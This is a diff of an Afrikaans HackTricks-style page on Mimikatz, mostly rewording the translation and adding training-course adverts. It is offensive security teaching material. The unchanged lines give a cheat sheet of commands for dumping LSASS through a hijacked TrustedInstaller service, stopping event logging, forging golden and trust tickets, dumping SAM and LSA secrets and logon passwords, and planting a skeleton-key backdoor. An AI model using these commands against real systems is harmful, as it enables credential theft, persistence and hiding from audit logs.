@@ -15,23 +15,30 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Kyk na die oorspronklike vir verdere inligting!
 
 ## LM en Duidelike Teks in geheue
 
-Vanaf Windows 8.1 en Windows Server 2012 R2 is daar beduidende maatreëls geïmplementeer om teen diefstal van geloofsbriewe te beskerm:
+Vanaf Windows 8.1 en Windows Server 2012 R2, is beduidende maatreëls geïmplementeer om teen kredietbewysdiefstal te beskerm:
 
-- **LM hashes en duidelike teks wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
+- **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
 
-- **LSA Beskerming** word bekendgestel om die Plaaslike Sekuriteitsowerheid (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode-inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
+- **LSA Beskerming** word bekendgestel om die Local Security Authority (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
 1. Die registrasie te wysig by _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
-2. 'n Groep Beleidsobjek (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
+2. 'n Groep Beleid Objekt (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
 
 Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.
 
 ### Teenwerking van SeDebugPrivilege Verwydering
 
-Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om geloofsbriewe uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
+Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewyse uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -44,21 +51,21 @@ Dit stel die dumping van die `lsass.exe` geheue na 'n lêer in, wat dan op 'n an
 ```
 ## Mimikatz Opsies
 
-Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die gebeurtenisdienste om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:
+Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Gebeurtenisdienste om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:
 
 #### Skoonmaak van Gebeurtenislogs
 
 - **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
-- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit behels egter tipies die gebruik van stelsels gereedskap of skripte buite Mimikatz om spesifieke logs skoon te maak (bv. deur PowerShell of Windows Event Viewer te gebruik).
+- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit is egter tipies dat gebeurtenislog manipulasie die gebruik van stelsels gereedskap of skripte buite Mimikatz behels om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
 
-#### Eksperimentele Kenmerk: Patching van die Gebeurtenisdienste
+#### Eksperimentele Kenmerk: Patching die Gebeurtenisdienste
 
 - **Opdrag**: `event::drop`
-- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Gebeurtenis Registrasie Dienste te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse opneem.
+- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Gebeurtenisregistrasiediens te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse opneem.
 - Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`
 
 - Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige voorregte werk om stelseldienste te wysig.
-- Die `event::drop` opdrag patch dan die Gebeurtenis Registrasie diens.
+- Die `event::drop` opdrag patch dan die Gebeurtenisregistrasiediens.
 
 
 ### Kerberos Tekenaanvalle
@@ -99,7 +106,7 @@ Trust Tickets word gebruik om toegang tot hulpbronne oor domeine te verkry deur 
 
 - Opdrag: Soortgelyk aan Golden Ticket, maar vir vertrouensverhoudings.
 - Parameters:
-- `/target`: Die FQDN van die teiken-domein.
+- `/target`: Die FQDN van die teikendomein.
 - `/rc4`: Die NTLM-hash vir die vertrouensrekening.
 
 Voorbeeld:
@@ -114,7 +121,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **Gee die Kas**:
 - Opdrag: `kerberos::ptc`
-- Injekter Kerberos kaartjies vanaf kaslêers.
+- Spuit Kerberos kaartjies in vanaf kaslêers.
 - Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Gee die Kaartjie**:
@@ -126,7 +133,6 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Opdrag: `kerberos::purge`
 - Verwyder alle Kerberos kaartjies uit die sessie.
 - Nuttig voor die gebruik van kaartjie manipulasie opdragte om konflikte te vermy.
-
 
 ### Aktiewe Gids Manipulasie
 
@@ -147,7 +153,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dekripsie van geheime wat in die registrasie gestoor is.
+- **LSADUMP::Secrets**: Ontsleutel geheime wat in die registrasie gestoor is.
 - `mimikatz "lsadump::secrets" exit`
 
 - **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
@@ -158,7 +164,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Divers
 
-- **MISC::Skeleton**: Injekter 'n agterdeur in LSASS op 'n DC.
+- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Privilege Escalation
@@ -166,12 +172,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Backup**: Verkry rugsteunregte.
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Verkry foutopsporing regte.
+- **PRIVILEGE::Debug**: Verkry debug regte.
 - `mimikatz "privilege::debug" exit`
 
-### Krediet Dumping
+### Kredietdumping
 
-- **SEKURLSA::LogonPasswords**: Toon krediete vir ingelogde gebruikers.
+- **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
 - **SEKURLSA::Tickets**: Trek Kerberos kaartjies uit geheue.
@@ -199,6 +205,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Trek wagwoorde uit Windows Kluis.
 - `mimikatz "vault::cred /patch" exit`
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:
+
+{% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
 Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
